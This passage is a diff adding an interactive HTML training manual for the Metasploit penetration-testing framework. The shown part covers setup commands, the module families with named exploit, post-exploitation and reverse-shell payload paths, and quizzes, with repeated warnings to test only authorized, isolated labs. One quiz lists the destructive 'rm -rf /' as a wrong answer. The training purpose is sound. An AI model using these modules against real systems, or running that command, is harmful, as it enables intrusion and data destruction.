@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MSF Technical Manual — From Zero to Hero | MSExploit Framework</title>
+<meta name="description" content="Interactive technical manual: how the Metasploit (MSExploit) Framework works. Architecture, modules, payloads, exploitation, labs, post-exploitation.">
+<style>
+/* ============ RESET / TOKENS ============ */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --paper:#f4f1e8; --paper2:#ebe5d3; --ink:#1a1c22; --ink2:#3c3f4a;
+  --accent:#c1121f; --accent2:#ffba08; --ok:#0a7d44; --bad:#c1121f;
+  --term-bg:#0b0e14; --term-green:#33ff66; --term-amber:#ffb000; --term-blue:#57b6ff;
+  --card:#ffffff; --line:#d8d0b8; --sidebar:#14161d; --sidebar2:#1e2230;
+  --radius:10px; --mono:Consolas,"Courier New","Lucida Console",monospace;
+  --serif:Georgia,"Times New Roman",serif; --sans:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+}
+html{scroll-behavior:smooth}
+body{background:var(--paper);color:var(--ink);font-family:var(--sans);line-height:1.65;font-size:16px}
+a{color:#0b5cad}
+::selection{background:var(--accent2)}
+
+/* ============ TOP BAR ============ */
+.topbar{position:sticky;top:0;z-index:50;background:var(--ink);color:#fff;border-bottom:4px solid var(--accent);display:flex;align-items:center;gap:14px;padding:10px 18px;flex-wrap:wrap}
+.brand{display:flex;align-items:center;gap:12px;text-decoration:none;color:#fff}
+.brand-badge{width:42px;height:42px;background:var(--accent);color:#fff;display:grid;place-items:center;font-family:var(--mono);font-weight:900;border-radius:8px;box-shadow:2px 2px 0 var(--accent2);font-size:19px}
+.brand b{font-family:var(--mono);letter-spacing:1px;font-size:17px}
+.brand small{display:block;font-size:11px;color:#ffd166;letter-spacing:2px;font-weight:700}
+.topnav{display:flex;gap:8px;margin-left:auto;flex-wrap:wrap;align-items:center}
+.topnav a.homelink{background:var(--accent2);color:#111;text-decoration:none;font-weight:800;font-family:var(--mono);padding:8px 16px;border-radius:6px;border:2px solid #111;box-shadow:3px 3px 0 #000}
+.topnav a.homelink:hover{background:#fff}
+.progress-wrap{flex-basis:100%;background:#000;border-radius:99px;height:14px;overflow:hidden;border:1px solid #444;position:relative}
+.progress-fill{height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--accent2),var(--term-green));transition:width .6s ease}
+.progress-label{position:absolute;inset:0;display:grid;place-items:center;font-size:10px;font-family:var(--mono);color:#fff;text-shadow:0 1px 2px #000;letter-spacing:1px}
+
+/* ============ LAYOUT ============ */
+.layout{display:grid;grid-template-columns:300px 1fr;min-height:calc(100vh - 90px)}
+.sidebar{background:var(--sidebar);color:#dfe3ee;padding:18px 14px;position:sticky;top:86px;align-self:start;height:calc(100vh - 86px);overflow:auto}
+.sidebar h3{font-family:var(--mono);font-size:12px;letter-spacing:2px;color:var(--accent2);margin:6px 6px 10px}
+.toc{list-style:none;display:flex;flex-direction:column;gap:6px}
+.toc button{width:100%;text-align:left;background:var(--sidebar2);color:#dfe3ee;border:1px solid #33395a;border-radius:8px;padding:10px 10px;cursor:pointer;font-family:var(--sans);display:flex;gap:10px;align-items:center}
+.toc button .n{font-family:var(--mono);background:#000;border:1px solid #555;color:var(--accent2);border-radius:6px;min-width:34px;text-align:center;padding:2px 6px;font-weight:800}
+.toc button.active{outline:2px solid var(--accent2);background:#2a3048}
+.toc button.locked{opacity:.45;cursor:not-allowed}
+.toc button .lock{margin-left:auto}
+.toc button:not(.locked):hover{background:#2e3552}
+.side-note{margin-top:16px;background:#0b0e14;border:1px dashed var(--accent2);border-radius:8px;padding:12px;font-size:13px;color:#ffe9a8}
+.side-note code{color:var(--term-green);font-family:var(--mono)}
+.resetbtn{margin-top:10px;width:100%;background:transparent;color:#ff8f8f;border:1px solid #ff8f8f;border-radius:6px;padding:8px;cursor:pointer;font-family:var(--mono)}
+.resetbtn:hover{background:#2a1212}
+.content{padding:26px clamp(16px,4vw,54px) 80px;max-width:1080px}
+
+/* ============ MANUAL PAGE CHROME ============ */
+.manual-sheet{background:var(--card);border:2px solid var(--ink);border-radius:12px;box-shadow:8px 8px 0 var(--ink);overflow:hidden;margin-bottom:26px}
+.sheet-head{background:var(--ink);color:#fff;padding:14px 20px;display:flex;gap:14px;align-items:center;flex-wrap:wrap}
+.sheet-head .docno{font-family:var(--mono);background:var(--accent);padding:4px 10px;border-radius:4px;font-size:12px;letter-spacing:1px}
+.sheet-head h1,.sheet-head h2{font-family:var(--serif);font-size:clamp(20px,3vw,30px);line-height:1.2}
+.sheet-meta{background:var(--paper2);border-bottom:2px solid var(--ink);padding:8px 20px;font-family:var(--mono);font-size:12px;display:flex;gap:18px;flex-wrap:wrap}
+.sheet-body{padding:24px clamp(16px,3vw,36px)}
+.sheet-body h3{font-family:var(--serif);font-size:22px;margin:26px 0 10px;padding-left:12px;border-left:6px solid var(--accent)}
+.sheet-body h4{font-family:var(--mono);font-size:15px;margin:18px 0 8px;color:var(--accent);text-transform:uppercase;letter-spacing:1px}
+.sheet-body p{margin:10px 0;color:var(--ink2)}
+.sheet-body ul,.sheet-body ol{margin:10px 0 10px 22px;color:var(--ink2)}
+.sheet-body li{margin:6px 0}
+.callout{border:2px solid var(--ink);border-radius:8px;padding:14px 16px;margin:16px 0;background:#fffdf0;position:relative}
+.callout.warn{background:#fff0f0;border-color:var(--accent)}
+.callout.ok{background:#ecfdf3;border-color:var(--ok)}
+.callout.info{background:#eef6ff;border-color:#0b5cad}
+.callout b.tag{display:inline-block;font-family:var(--mono);font-size:11px;letter-spacing:1px;padding:2px 8px;border-radius:4px;background:var(--ink);color:#fff;margin-bottom:8px}
+.callout.warn b.tag{background:var(--accent)} .callout.ok b.tag{background:var(--ok)} .callout.info b.tag{background:#0b5cad}
+table.spec{width:100%;border-collapse:collapse;margin:14px 0;font-size:14px;background:#fff}
+table.spec th,table.spec td{border:1px solid var(--ink);padding:9px 10px;text-align:left;vertical-align:top}
+table.spec th{background:var(--ink);color:#fff;font-family:var(--mono);font-size:12px;letter-spacing:1px}
+table.spec td code, p code, li code{background:#111;color:var(--term-green);font-family:var(--mono);padding:1px 6px;border-radius:4px;font-size:.88em}
+table.spec td:nth-child(1){font-family:var(--mono);font-weight:700}
+kbd{font-family:var(--mono);background:#111;color:#fff;padding:2px 7px;border-radius:4px;border:1px solid #555;box-shadow:0 2px 0 #555;font-size:13px}
+
+/* ============ TERMINAL ============ */
+.terminal{background:var(--term-bg);border:2px solid #000;border-radius:10px;margin:16px 0;overflow:hidden;box-shadow:0 8px 24px rgba(0,0,0,.25)}
+.term-bar{display:flex;gap:8px;align-items:center;background:#1a1f2e;padding:9px 12px;border-bottom:1px solid #333}
+.dot{width:12px;height:12px;border-radius:50%}.r{background:#ff5f56}.y{background:#ffbd2e}.g{background:#27c93f}
+.term-bar span.t{margin-left:8px;color:#9aa3c0;font-family:var(--mono);font-size:12px}
+.term-body{padding:16px;font-family:var(--mono);font-size:13.5px;line-height:1.6;color:#d6dbe8;min-height:120px;white-space:pre-wrap;word-break:break-word}
+.term-body .p{color:var(--term-green)} .term-body .c{color:var(--term-amber)} .term-body .b{color:var(--term-blue)} .term-body .dim{color:#8b93ad}
+.cursor{display:inline-block;width:9px;height:17px;background:var(--term-green);vertical-align:-3px;animation:blink 1s steps(1) infinite}
+@keyframes blink{50%{opacity:0}}
+.term-controls{display:flex;gap:8px;padding:10px 12px;background:#111624;border-top:1px solid #333;flex-wrap:wrap}
+.term-controls button{background:var(--accent2);border:2px solid #000;border-radius:6px;font-family:var(--mono);font-weight:800;padding:7px 12px;cursor:pointer}
+.term-controls button.ghost{background:#222a44;color:#fff;border-color:#555}
+.term-controls button:hover{filter:brightness(1.1)}
+.cmd-input{width:100%;background:#000;color:var(--term-green);border:1px solid #444;border-radius:6px;font-family:var(--mono);padding:9px 10px;margin-top:8px}
+
+/* ============ ANIMATED DIAGRAMS ============ */
+.stage{background:#0b0e14;border-radius:10px;padding:20px;margin:16px 0;color:#dfe3ee;border:2px solid #000;position:relative;overflow:hidden}
+.stage h5{font-family:var(--mono);color:var(--accent2);letter-spacing:1px;font-size:13px;margin-bottom:14px}
+.stage .hint{font-size:12px;color:#9aa3c0;font-family:var(--mono);margin-top:10px}
+.nodes{display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap}
+.node{background:#1a1f2e;border:2px solid var(--term-blue);border-radius:10px;padding:12px 14px;text-align:center;min-width:130px;flex:1}
+.node.attacker{border-color:var(--term-green)} .node.victim{border-color:var(--accent)} .node.net{border-color:#555;background:#111}
+.node .ico{font-size:26px} .node b{display:block;font-family:var(--mono);font-size:13px;margin-top:4px} .node small{color:#9aa3c0;font-size:11px}
+.pipe{position:relative;flex:1.4;min-width:160px;height:64px;background:#111624;border:1px dashed #444;border-radius:8px;overflow:hidden}
+.packet{position:absolute;top:50%;width:14px;height:14px;border-radius:50%;transform:translateY(-50%);animation:flow 2.6s linear infinite}
+.packet.syn{left:0;background:var(--term-blue);--tx:calc(100% - 14px)}
+.packet.rst{background:var(--accent)}
+@keyframes flow{from{left:0;opacity:0}10%{opacity:1}90%{opacity:1}to{left:calc(100% - 14px);opacity:0}}
+.packet.rev{background:var(--term-green);animation-name:flowrev}
+@keyframes flowrev{from{left:calc(100% - 14px);opacity:0}10%{opacity:1}90%{opacity:1}to{left:0;opacity:0}}
+.packet.stager{background:var(--accent2);width:10px;height:10px}
+.packet.stage2{background:var(--term-green);width:20px;height:20px;border-radius:4px;animation-duration:4s}
+.lane-labels{display:flex;justify-content:space-between;font-family:var(--mono);font-size:11px;color:#9aa3c0;margin-top:6px}
+.toggle-row{display:flex;gap:10px;margin:12px 0;flex-wrap:wrap}
+.toggle-row button{flex:1;min-width:180px;background:#1a1f2e;color:#fff;border:2px solid #444;border-radius:8px;padding:10px;cursor:pointer;font-family:var(--mono);font-weight:700}
+.toggle-row button.on{border-color:var(--term-green);background:#0f2a1a}
+.bar-anim{display:flex;gap:6px;align-items:flex-end;height:90px;margin:12px 0;background:#111624;border-radius:8px;padding:10px}
+.bar-anim i{flex:1;background:linear-gradient(var(--term-blue),#1a3a5c);border-radius:4px 4px 0 0;animation:eq 1.2s ease-in-out infinite alternate}
+.bar-anim i:nth-child(2n){animation-delay:.15s;background:linear-gradient(var(--term-green),#0f3d22)}
+.bar-anim i:nth-child(3n){animation-delay:.3s;background:linear-gradient(var(--accent),#5c1010)}
+@keyframes eq{from{height:12%}to{height:88%}}
+.timeline{display:flex;flex-direction:column;gap:0;margin:14px 0}
+.tstep{display:grid;grid-template-columns:44px 1fr;gap:12px;position:relative;padding-bottom:18px}
+.tstep::before{content:"";position:absolute;left:21px;top:44px;bottom:0;width:3px;background:#333}
+.tstep:last-child::before{display:none}
+.tnum{width:44px;height:44px;border-radius:50%;background:var(--accent);color:#fff;display:grid;place-items:center;font-family:var(--mono);font-weight:900;border:2px solid #fff;z-index:1}
+.tcard{background:#1a1f2e;border:1px solid #444;border-radius:8px;padding:10px 12px;font-size:13.5px}
+.tcard code{color:var(--term-green);font-family:var(--mono)}
+.exploit-flash{animation:flash 1.6s ease-in-out infinite;border-color:var(--accent)!important}
+@keyframes flash{0%,100%{box-shadow:0 0 0 rgba(193,18,31,0)}50%{box-shadow:0 0 22px rgba(193,18,31,.9)}}
+
+/* ============ QUIZ ============ */
+.quiz{border:2px dashed var(--ink);border-radius:10px;background:#fffdf0;padding:18px;margin:20px 0}
+.quiz h4{font-family:var(--mono);letter-spacing:1px;color:var(--ink)}
+.quiz .q{margin:14px 0;padding:12px;background:#fff;border:1px solid var(--line);border-radius:8px}
+.quiz .q p{font-weight:700;color:var(--ink)}
+.quiz label{display:block;background:var(--paper);border:1px solid var(--line);border-radius:6px;padding:8px 10px;margin:7px 0;cursor:pointer;font-size:14px}
+.quiz label:hover{border-color:var(--ink)}
+.quiz label.correct{border-color:var(--ok);background:#e7f9ef}
+.quiz label.wrong{border-color:var(--bad);background:#fdecec}
+.quiz .qres{font-family:var(--mono);font-size:13px;margin-top:6px}
+.quiz-btn{background:var(--ink);color:#fff;font-family:var(--mono);font-weight:800;padding:10px 18px;border-radius:8px;border:2px solid #000;cursor:pointer;margin-top:6px}
+.quiz-btn:hover{background:var(--accent)}
+.quiz-btn:disabled{opacity:.5;cursor:not-allowed}
+.pass-badge{display:none;background:var(--ok);color:#fff;font-family:var(--mono);padding:8px 12px;border-radius:6px;margin-top:10px;font-weight:800}
+.pass-badge.show{display:inline-block}
+.fail-badge{display:none;background:var(--bad);color:#fff;font-family:var(--mono);padding:8px 12px;border-radius:6px;margin-top:10px;font-weight:800}
+.fail-badge.show{display:inline-block}
+
+/* ============ CHAPTER NAV ============ */
+.chapnav{display:flex;justify-content:space-between;gap:10px;margin-top:22px;flex-wrap:wrap}
+.chapnav button{background:var(--accent);color:#fff;border:2px solid #000;border-radius:8px;padding:11px 18px;font-family:var(--mono);font-weight:800;cursor:pointer;box-shadow:3px 3px 0 #000}
+.chapnav button[disabled]{background:#999;cursor:not-allowed;box-shadow:none}
+.chapnav button:not([disabled]):hover{background:#8f0d17}
+.chapter{display:none}
+.chapter.active{display:block;animation:fadein .35s ease}
+@keyframes fadein{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+
+/* labs tabs */
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin:12px 0}
+.tabs button{background:var(--paper2);border:2px solid var(--ink);border-radius:8px 8px 0 0;padding:9px 14px;font-family:var(--mono);font-weight:800;cursor:pointer}
+.tabs button.on{background:var(--ink);color:var(--accent2)}
+.tabpane{display:none;border:2px solid var(--ink);border-radius:0 8px 8px 8px;padding:16px;background:#fff}
+.tabpane.on{display:block}
+pre.code{background:#0b0e14;color:#d6dbe8;font-family:var(--mono);font-size:13px;padding:14px;border-radius:8px;overflow:auto;margin:12px 0;border:1px solid #000;line-height:1.6}
+pre.code .g{color:var(--term-green)} pre.code .y{color:var(--term-amber)} pre.code .b{color:var(--term-blue)} pre.code .d{color:#8b93ad}
+.stamp{display:inline-block;font-family:var(--mono);font-size:11px;background:var(--accent);color:#fff;padding:3px 9px;border-radius:99px;letter-spacing:1px;margin:4px 4px 4px 0}
+.stamp.blue{background:#0b5cad}.stamp.green{background:var(--ok)}.stamp.gold{background:#8a6d00}
+footer{background:var(--ink);color:#c9cfe3;padding:26px 20px;font-size:13px;margin-top:10px}
+footer a{color:var(--accent2)}
+.sources{columns:2;gap:26px;font-size:13px}
+.sources li{break-inside:avoid;margin-bottom:8px}
+@media(max-width:960px){.layout{grid-template-columns:1fr}.sidebar{position:static;height:auto}.sources{columns:1}}
+@media print{.sidebar,.topnav,.chapnav,.term-controls,.quiz-btn{display:none}.chapter{display:block}}
+</style>
+</head>
+<body>
+
+<header class="topbar">
+  <a class="brand" href="index.html" title="Home — index.html">
+    <span class="brand-badge">MSF</span>
+    <span><b>MSExploit Framework</b><small>TECHNICAL MANUAL · TM-2600-MSF</small></span>
+  </a>
+  <nav class="topnav">
+    <a class="homelink" href="index.html">⌂ Home</a>
+  </nav>
+  <div class="progress-wrap" title="Manual completion">
+    <div class="progress-fill" id="progressFill"></div>
+    <div class="progress-label" id="progressLabel">CLEARANCE 0% — RECRUIT</div>
+  </div>
+</header>
+
+<div class="layout">
+<!-- ================= SIDEBAR ================= -->
+<aside class="sidebar">
+  <h3>▚ FIELD MANUAL — CONTENTS</h3>
+  <ol class="toc" id="toc"></ol>
+  <div class="side-note">⚠ <b>Rules of engagement:</b> only test systems you own or have <b>written permission</b> to test. Labs in this manual run on an isolated <code>host-only</code> network. Never point these modules at real networks.<br><br>Pass each level's <code>validation quiz (≥ 2/3)</code> to unlock the next chapter. Progress is stored in <code>localStorage</code>.</div>
+  <button class="resetbtn" id="resetBtn">↺ Reset all clearance</button>
+</aside>
+
+<!-- ================= CONTENT ================= -->
+<main class="content" id="mainContent">
+
+<!-- ============ CHAPTER 0 : HOME ============ -->
+<section class="chapter" data-chap="0">
+<div class="manual-sheet">
+  <div class="sheet-head"><span class="docno">TM-2600-MSF §0</span><h1>MSExploit Framework: From Zero to Hero</h1></div>
+  <div class="sheet-meta"><span>REV 4.2 · OCT 2026</span><span>CLASS: TRAINING USE ONLY</span><span>PREREQ: NONE</span><span>TIME: ~3 HOURS</span></div>
+  <div class="sheet-body">
+    <p><b>Welcome, operator.</b> This page is a self-contained <b>technical manual</b> for the <b>MSExploit Framework</b> — the community nickname for <b>Metasploit Framework</b>, the Ruby-based modular penetration-testing platform maintained by Rapid7. No external CSS, JS files, fonts or CDNs are used: everything you see is pure vanilla HTML + CSS3 + JavaScript in this single <code>index.html</code>.</p>
+    <div class="callout info"><b class="tag">HOW TO USE THIS MANUAL</b><br>You must proceed <b>in order</b>. Each level ends with an <b>interactive validation quiz</b>. Score at least <b>2 of 3</b> to unlock the next level and earn clearance. Your rank grows: Recruit → Scout → Operator → Exploiter → Controller → Architect → <b>Hero</b>.</div>
+    <h3>What you will master</h3>
+    <ol>
+      <li><b>Level 1 — Zero:</b> what the framework is, why it exists, ethics, installation, <code>msfconsole</code> tour.</li>
+      <li><b>Level 2 — Modules:</b> exploit / auxiliary / payload / encoder / evasion / post / nop — with animated anatomy.</li>
+      <li><b>Level 3 — Payloads:</b> staged vs stageless, bind vs reverse, Meterpreter, <code>msfvenom</code>.</li>
+      <li><b>Level 4 — Exploitation workflow:</b> search → use → set → check → run → sessions.</li>
+      <li><b>Level 5 — Real exploits:</b> vsftpd 2.3.4 (CVE-2011-2523), UnrealIRCd (CVE-2010-2075), EternalBlue (MS17-010).</li>
+      <li><b>Level 6 — Testing labs:</b> Kali + Metasploitable 2 / 3, Windows XP / 7 / Server 2008 isolated ranges.</li>
+      <li><b>Level 7 — Post-exploitation:</b> Meterpreter, pivoting, persistence, loot, cleanup + final Hero exam.</li>
+    </ol>
+    <h3>Benefit map — why professionals use it</h3>
+    <table class="spec">
+      <tr><th>Benefit</th><th>What it means in practice</th></tr>
+      <tr><td>Modularity</td><td>Exploit and payload are decoupled. One SMB bug can be paired with dozens of payloads without rewriting code.</td></tr>
+      <tr><td>Repeatability</td><td><code>show options / check / run</code> makes every test documented and re-runnable for reports.</td></tr>
+      <tr><td>Safety valves</td><td><code>check</code>, <code>Rank</code> (Manual → Excellent), target lists and snapshots prevent blind firing.</td></tr>
+      <tr><td>Session management</td><td>One console handles tens of shells/Meterpreters, routing, backgrounding (<code>Ctrl+Z</code> / <code>background</code>).</td></tr>
+      <tr><td>Database + reporting</td><td>Optional PostgreSQL backend (<code>db_status</code>, <code>hosts</code>, <code>services</code>, <code>vulns</code>) tracks a whole engagement.</td></tr>
+    </table>
+    <div class="callout warn"><b class="tag">⚠ LEGAL WARNING</b> Exploitation without authorization is a crime in most jurisdictions. Build the labs in Level 6 on <b>host-only / internal</b> virtual networks with <b>snapshots</b>, and never bridge vulnerable VMs to home, work or public networks.</div>
+
+    <div class="quiz" data-quiz="0" data-need="2">
+      <h4>▣ VALIDATION 0 — ENTRY CHECK (unlocks Level 1)</h4>
+      <div class="q" data-answer="1"><p>1. What is the MSExploit/Metasploit Framework at its core?</p>
+        <label><input type="radio" name="q0a" value="0"> A hacking virus you install on victims</label>
+        <label><input type="radio" name="q0a" value="1"> A modular Ruby penetration-testing platform (exploits + payloads + console)</label>
+        <label><input type="radio" name="q0a" value="2"> A VPN that hides attackers</label>
+        <div class="qres"></div></div>
+      <div class="q" data-answer="0"><p>2. What is required before testing any system with this manual?</p>
+        <label><input type="radio" name="q0b" value="0"> Ownership or explicit written authorization, isolated lab</label>
+        <label><input type="radio" name="q0b" value="1"> Nothing — public IPs are fair game</label>
+        <label><input type="radio" name="q0b" value="2"> Only a fast internet connection</label>
+        <div class="qres"></div></div>
+      <div class="q" data-answer="2"><p>3. Which file is this entire manual delivered in?</p>
+        <label><input type="radio" name="q0c" value="0"> A dozen linked pages and a CDN bundle</label>
+        <label><input type="radio" name="q0c" value="1"> A PDF download</label>
+        <label><input type="radio" name="q0c" value="2"> One single index.html with vanilla JS + CSS3, no external resources</label>
+        <div class="qres"></div></div>
+      <button class="quiz-btn">Validate knowledge →</button>
+      <span class="pass-badge">✔ PASSED — Level 1 unlocked</span><span class="fail-badge">✘ Need ≥ 2/3 — review and retry</span>
+    </div>
+    <div class="chapnav"><span></span><button data-goto="1">Next: Level 1 — Zero ↓</button></div>
+  </div>
+</div>
+</section>
+
+<!-- ============ CHAPTER 1 ============ -->
+<section class="chapter" data-chap="1">
+<div class="manual-sheet">
+  <div class="sheet-head"><span class="docno">TM-2600-MSF §1</span><h2>Level 1 — Zero: Concepts, Ethics & First Launch</h2></div>
+  <div class="sheet-meta"><span>CLEARANCE: SCOUT</span><span>OBJECTIVE: UNDERSTAND THE MACHINE</span></div>
+  <div class="sheet-body">
+    <h3>1.1 What "exploitation" actually means</h3>
+    <p>A <b>vulnerability</b> is a flaw (bad input handling, missing check, backdoored build). An <b>exploit</b> is a program that <i>drives</i> that flaw to divert execution — classically by overwriting a return address, injecting a command, or abusing logic. The <b>payload</b> is what runs <i>after</i> the diversion: a shell, a Meterpreter agent, a command. The framework's genius: <b>exploit and payload are separate modules</b> that snap together.</p>
+    <div class="stage"><h5>◉ ANIMATED: VULN → EXPLOIT → PAYLOAD → SESSION</h5>
+      <div class="nodes">
+        <div class="node victim"><div class="ico">🖥️</div><b>TARGET APP</b><small>flawed service</small></div>
+        <div class="pipe"><div class="packet" style="animation-duration:2.2s"></div><div class="lane-labels"><span>malformed input</span><span>⚡</span></div></div>
+        <div class="node net"><div class="ico">💉</div><b>EXPLOIT</b><small>hijacks flow</small></div>
+        <div class="pipe"><div class="packet stager" style="animation-duration:3s"></div><div class="lane-labels"><span>payload</span><span>⚡</span></div></div>
+        <div class="node attacker"><div class="ico">🎛️</div><b>HANDLER</b><small>session 1 opened</small></div>
+      </div>
+      <div class="hint">Blue = exploit traffic · Gold = payload delivery · Watch packets travel attacker → victim → session.</div>
+    </div>
+    <h3>1.2 Under the hood: directories & language</h3>
+    <p>Written in <b>Ruby</b>. Source tree separates <code>modules/</code> (the 7 module families), <code>lib/</code> (core: Rex sockets, Msf::Exploit, session handling), <code>data/</code> (shellcode, wordlists), <code>plugins/</code>, <code>scripts/</code>, optional <b>PostgreSQL</b> DB for hosts/services/vulns. Console = <code>msfconsole</code>; generator = <code>msfvenom</code>.</p>
+    <h3>1.3 Install (Kali — attacker VM)</h3>
+<pre class="code"><span class="d"># Kali already ships it. Init DB once, then launch:</span>
+<span class="g">sudo msfdb init</span>
+<span class="g">msfconsole -q</span>
+<span class="d">msf6 &gt;</span> <span class="y">db_status</span>      <span class="d"># should say: connected to msf</span>
+<span class="d">msf6 &gt;</span> <span class="y">version</span>        <span class="d"># e.g. Framework: 6.3.x</span>
+<span class="d">msf6 &gt;</span> <span class="y">help</span>           <span class="d"># search | use | show options | set | run | sessions</span></pre>
+    <h3>1.4 Your first safe run: try the terminal</h3>
+    <p>Press <b>Run demo</b> — a scripted <code>msfconsole</code> boot. Then type <code>help</code>, <code>search vsftpd</code> or <code>version</code> in the box and hit Enter.</p>
+    <div class="terminal"><div class="term-bar"><i class="dot r"></i><i class="dot y"></i><i class="dot g"></i><span class="t">operator@kali: msfconsole — LEVEL 1 SIMULATOR</span></div>
+      <div class="term-body" id="term1"></div>
+      <div class="term-controls"><button data-term="term1" data-demo="boot">▶ Run demo</button><button class="ghost" data-term="term1" data-demo="clear">Clear</button><input class="cmd-input" data-for="term1" placeholder="msf6 > type a command, e.g. help"></div>
+    </div>
+    <div class="quiz" data-quiz="1" data-need="2">
+      <h4>▣ VALIDATION 1 — ZERO CHECK</h4>
+      <div class="q" data-answer="1"><p>1. Exploit vs payload?</p><label><input type="radio" name="q1a" value="0"> They are the same thing</label><label><input type="radio" name="q1a" value="1"> Exploit triggers the flaw; payload is the code that runs after</label><label><input type="radio" name="q1a" value="2"> Payload finds the flaw; exploit cleans logs</label><div class="qres"></div></div>
+      <div class="q" data-answer="0"><p>2. Which command checks DB connectivity in msfconsole?</p><label><input type="radio" name="q1b" value="0"> db_status</label><label><input type="radio" name="q1b" value="1"> hack_all</label><label><input type="radio" name="q1b" value="2"> rm -rf /</label><div class="qres"></div></div>
+      <div class="q" data-answer="2"><p>3. What language is the Framework mainly written in?</p><label><input type="radio" name="q1c" value="0"> Assembly only</label><label><input type="radio" name="q1c" value="1"> JavaScript</label><label><input type="radio" name="q1c" value="2"> Ruby</label><div class="qres"></div></div>
+      <button class="quiz-btn">Validate knowledge →</button><span class="pass-badge">✔ PASSED — Level 2 unlocked</span><span class="fail-badge">✘ Need ≥ 2/3</span>
+    </div>
+    <div class="chapnav"><button data-goto="0">← Home</button><button data-goto="2">Next: Level 2 — Modules ↓</button></div>
+  </div>
+</div>
+</section>
+
+<!-- ============ CHAPTER 2 ============ -->
+<section class="chapter" data-chap="2">
+<div class="manual-sheet">
+  <div class="sheet-head"><span class="docno">TM-2600-MSF §2</span><h2>Level 2 — The Seven Module Families</h2></div>
+  <div class="sheet-meta"><span>CLEARANCE: OPERATOR</span><span>OBJECTIVE: KNOW EVERY DRAWER</span></div>
+  <div class="sheet-body">
+    <h3>2.1 The arsenal table</h3>
+    <table class="spec"><tr><th>Family</th><th>Role</th><th>Creates session?</th><th>Example path</th></tr>
+    <tr><td>exploit</td><td>Triggers a vuln to gain execution</td><td>yes (via payload)</td><td><code>exploit/unix/ftp/vsftpd_234_backdoor</code></td></tr>
+    <tr><td>auxiliary</td><td>Scan / enumerate / fuzz / admin — no exploitation</td><td>usually not</td><td><code>auxiliary/scanner/smb/smb_ms17_010</code></td></tr>
+    <tr><td>payload</td><td>Code run after success: shell, Meterpreter</td><td>—</td><td><code>windows/x64/meterpreter/reverse_tcp</code></td></tr>
+    <tr><td>encoder</td><td>Reshapes payload bytes (bad-chars, size). <b>Not</b> reliable AV evasion</td><td>—</td><td><code>x86/shikata_ga_nai</code></td></tr>
+    <tr><td>evasion</td><td>Alters delivery traits to dodge detection (hit-or-miss)</td><td>—</td><td><code>windows_defender_exe</code> style</td></tr>
+    <tr><td>post</td><td>Runs <i>inside</i> a session: loot, escalate, pivot</td><td>needs session</td><td><code>post/windows/gather/hashdump</code></td></tr>
+    <tr><td>nop</td><td>NOP sleds for alignment in classic overflows</td><td>—</td><td><code>x86/single_byte</code></td></tr></table>
+    <div class="stage"><h5>◉ ANIMATED: WHERE EACH MODULE SITS IN THE KILL-CHAIN</h5>
+      <div class="timeline">
+        <div class="tstep"><div class="tnum">1</div><div class="tcard"><code>auxiliary/scanner/*</code> — knock, fingerprint, <b>check</b>. No bang. <div class="bar-anim"><i></i><i></i><i></i><i></i><i></i><i></i><i></i><i></i></div></div></div>
+        <div class="tstep"><div class="tnum">2</div><div class="tcard"><code>exploit/…</code> + <code>payload/…</code> + optional <code>encoder/nop/evasion</code> — the shot. <b class="stamp">RANK: MANUAL→EXCELLENT</b></div></div>
+        <div class="tstep"><div class="tnum">3</div><div class="tcard"><code>handler</code> catches reverse/bind → <b>session 1</b> opens. <code>sessions -l / -i</code></div></div>
+        <div class="tstep"><div class="tnum">4</div><div class="tcard"><code>post/…</code> — loot, escalate, pivot through the session.</div></div>
+      </div>
+      <div class="hint">Rank matters: "Excellent" = safe/reliable; "Manual" = fiddly, may crash target — snapshot first.</div>
+    </div>
+    <h3>2.2 Anatomy of a module: try it</h3>
+    <p>Every module answers <code>info</code>, declares <code>show options</code> (RHOSTS, RPORT, LHOST…), supports <code>check</code> (if implemented) and fires with <code>run</code>/<code>exploit</code>.</p>
+    <div class="terminal"><div class="term-bar"><i class="dot r"></i><i class="dot y"></i><i class="dot g"></i><span class="t">operator@kali: module anatomy</span></div>
+      <div class="term-body" id="term2"></div>
+      <div class="term-controls"><button data-term="term2" data-demo="module">▶ Run demo</button><button class="ghost" data-term="term2" data-demo="clear">Clear</button><input class="cmd-input" data-for="term2" placeholder="try: info | show options | check"></div>
+    </div>
+    <div class="quiz" data-quiz="2" data-need="2">
+      <h4>▣ VALIDATION 2 — MODULES CHECK</h4>
+      <div class="q" data-answer="2"><p>1. Which module type only scans/enumerates and normally opens no shell?</p><label><input type="radio" name="q2a" value="0"> exploit</label><label><input type="radio" name="q2a" value="1"> post</label><label><input type="radio" name="q2a" value="2"> auxiliary</label><div class="qres"></div></div>
+      <div class="q" data-answer="1"><p>2. Encoders guarantee antivirus evasion?</p><label><input type="radio" name="q2b" value="0"> Yes, always</label><label><input type="radio" name="q2b" value="1"> No — they solve bad-chars/size; not reliable AV bypass</label><label><input type="radio" name="q2b" value="2"> Only on Linux</label><div class="qres"></div></div>
+      <div class="q" data-answer="0"><p>3. A post module needs…</p><label><input type="radio" name="q2c" value="0"> An existing session to run through</label><label><input type="radio" name="q2c" value="1"> Nothing at all</label><label><input type="radio" name="q2c" value="2"> A rebooted target</label><div class="qres"></div></div>
+      <button class="quiz-btn">Validate knowledge →</button><span class="pass-badge">✔ PASSED — Level 3 unlocked</span><span class="fail-badge">✘ Need ≥ 2/3</span>
+    </div>
+    <div class="chapnav"><button data-goto="1">← Level 1</button><button data-goto="3">Next: Level 3 — Payloads ↓</button></div>
+  </div>
+</div>
+</section>
+
+<!-- ============ CHAPTER 3 ============ -->
+<section class="chapter" data-chap="3">
+<div class="manual-sheet">
+  <div class="sheet-head"><span class="docno">TM-2600-MSF §3</span><h2>Level 3 — Payloads: Shells, Meterpreter & msfvenom</h2></div>
+  <div class="sheet-meta"><span>CLEARANCE: EXPLOITER</span><span>OBJECTIVE: CHOOSE THE RIGHT WARHEAD</span></div>
+  <div class="sheet-body">
+    <h3>3.1 Reading a payload name</h3>
